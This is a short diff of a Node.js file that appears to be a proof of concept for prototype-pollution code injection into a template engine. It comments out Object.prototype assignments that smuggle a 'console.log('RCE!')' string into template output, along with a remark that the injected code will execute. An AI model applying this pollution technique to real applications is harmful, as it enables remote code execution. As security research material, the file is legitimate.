@@ -3,10 +3,10 @@ const fs = require('fs');
 const path = require('path');
 
 // The template will broken but our injected code will be executed
-Object.prototype.value = "somevalue"
-Object.prototype.output = {
-    to: "console.log('RCE!')\nxxx"
-}
+// Object.prototype.value = "somevalue"
+// Object.prototype.output = {
+//     to: "console.log('RCE!')\nxxx"
+// }
 
 // This template includes the `render` directive
 const mainFilePath = path.join(__dirname, '/views/functions_and_block.blade');
